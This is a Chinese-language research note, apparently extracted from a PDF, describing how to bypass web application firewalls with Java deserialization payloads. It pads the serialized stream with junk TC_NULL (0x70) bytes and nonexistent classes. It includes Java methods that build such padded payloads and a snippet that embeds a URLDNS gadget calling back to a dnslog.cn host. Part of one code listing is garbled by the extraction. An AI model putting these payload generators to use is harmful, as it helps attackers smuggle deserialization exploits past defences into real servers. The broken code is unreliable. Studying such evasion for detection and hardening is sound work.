1
反序列化脏数据
Java反序列化数据绕WAF之加⼤量脏数据 
https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ 
其实就是再最外层封装⼀层，只要该类有对象属性，⼀般来说在反序列化的时候都会试着调⽤该属性的
readObject去还原他。所以我们要找的class，第⼀需要实现java.io.Serializable接⼝，第⼆可以存储任
意对象。这么看来集合类型就⾮常符合我们的需求。 
如 
1. ArrayList 
2. LinkedList 
3. HashMap 
4. LinkedHashMap 
5. TreeMap 
这个思路是基于@Y4tacker师傅做的扩展，源头总体来说还是这篇⽂章
https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA 
如上⽅法还是正常封装，⽽java反序列化，在ObjectInputStream#readSerialData中，有⼀个逻辑，即
使某块数据反序列化失败，仍然可以继续下⼀块数据的反序列化，⽐如LinkedList.add添加多个，每个
脏数据1.0 
脏数据2.0 
Java
复制代码
List a = new LinkedList();
a.add(new FindClassByDNS().makeClass("TargetClass"));
a.add(new URLDNS().getObject("http://1234.z6lh5t.dnslog.cn", null));
1
2
3
2
对象不影响下个对象反序列化。如下图是个⼤的for循环。 
⽽skipCustomData应该是⽤于处理⼀些⾃定义数据，120（0x78）是块数据结束符。下图是jdk1.6的 
3
这是jdk1.8，对⽐多个版本主要是确认119和121是否都是⽆操作，⽬前看来只有119（0x77）即
TC_BLOCKDATA是空操作，那么就可以在块中插⼊脏数据0x77。 
4
调试发现  this.readObject0(false) 会调⽤下⼀个序列化数据，⽽该bin.peekByte读取的是
0x73， 
5
尝试插⼊⼀字节测试 
发现在readBlockHeader⾥报错了 
6
原来这⾥也会读取到119，那么这个字节就不能⽤了。 
其实根据这个思路，可以找⼀些其他位置或其他字符来测试。 
7
简单看了下，发现0x70表示Null，⽽ 
并且原来这⾥0x78后⾯也是112(0x70 TC_NULL) 
8
所以尝试插⼊，发现可以了，可以继续反序列化hashmap了（这⾥测试的是URLDNS），后续就是正常
过程了。 
仔细跟踪了下，  readBlockHeader ⾥如果是112(0x70 TC_NULL)，那么就和不插⼊⼀样，正常进⾏
后续解析。 
9
readBlockHeader 是在  this.bin.skipBlockData() ⾥，⼀般只会执⾏⼀次。然后  this.re
adObject0(false) ⾥的switch判断类型，如果是112(0x70 TC_NULL)也就跳过不处理，继续后续
处理。 
10
11
绕过119(0x77 TC_BLOCKDATA)的报错了，那么我突然想在这后⾯再插⼊119(0x77 
TC_BLOCKDATA)是不是也⾏。- -傻逼了，go写多了，case 119没有break，会步⼊122，那么就会继
续解析之前的blockheader。到这突然⼜想到，那么我在0x77后⾯再插⼊0x70是不是就⼜绕回来了。 
这⾥出现了⼀个误解，peekByte是不会移动数据流的pos的，只有read、readFull等等才会，所以这⾥
没有⽤的。 
12
⽬前看来只能插⼊0x70了 
13
其他字节能否有同样效果，可以找下skipCustomData() ⾥的解析⽅法，  skipBlockData()->readB
lockHeader() 和  readObject0()  
总结下有两个新的⽅案 
1. 填充⼤量null代表的\x70 
14
2. 填充⼤量不存在的class，这个其实想填充啥填充啥 
Java
复制代码
// 通过LinkedList插⼊count个\x70
public  byte[] junkDataWithNull70(Object obj,int count) throws  Exception 
{
    // 插⼊不存在的class
    List list = new LinkedList();
    list.add(this.makeClass(RandomStringUtils.randomAlphabetic(10) + 
System.nanoTime()));
    list.add(obj);
    // 序列化
    byte[] serBytes = Serializer.serialize(list);
    // 插⼊脏数据
    String key = new String(new byte[]{0x78,0x70,0x73,0x72}, "ISO-8859-
1");
    String serStr = new String(serBytes, "ISO-8859-1");
    String junkData = Strings.repeat("p",count);
    int pos = serStr.indexOf(key) + 2;
    serStr = serStr.substring(0, pos) +  junkData  + 
serStr.substring(pos);
    serBytes = serStr.getBytes("ISO-8859-1");
    return serBytes;
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
15
或者把上⾯两种结合⼀下 
Java
复制代码
// 通过LinkedList插⼊count个不存在的class
public  byte[] junkDataWithCls(Object obj,int count) throws  Exception {
    // 插⼊不存在的class
    List list = new LinkedList();
    for (int i=0; i  list = new LinkedList();
    for (int i=0; i < count; i++) {
        list.add(this.makeClass(RandomStringUtils.randomAlphabetic(10) + 
System.nanoTime()));
    }
    list.add(obj);
    // 序列化
    byte[] serBytes = Serializer.serialize(list);
    // 插⼊脏数据
    String key = new String(new byte[]{0x78,0x70,0x73,0x72}, "ISO-8859-
1");
    String serStr = new String(serBytes, "ISO-8859-1");
    String junkData = Strings.repeat("p",count*100);
    int pos = serStr.indexOf(key) + 2;
    serStr = serStr.substring(0, pos) +  junkData  + 
serStr.substring(pos);
    serBytes = serStr.getBytes("ISO-8859-1");
    return serBytes;
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
17
测试效果如下，填充100个class和1W个\x70，